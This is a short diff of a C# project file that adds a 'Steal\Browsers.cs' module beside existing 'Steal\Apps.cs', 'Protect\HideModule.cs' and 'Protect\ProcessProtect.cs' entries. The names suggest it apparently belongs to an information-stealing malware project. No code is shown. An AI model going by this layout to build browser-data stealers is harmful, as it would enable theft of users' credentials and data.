@@ -50,6 +50,7 @@
     <Compile Include="Protect\HideModule.cs" />
     <Compile Include="Protect\ProcessProtect.cs" />
     <Compile Include="Steal\Apps.cs" />
+    <Compile Include="Steal\Browsers.cs" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
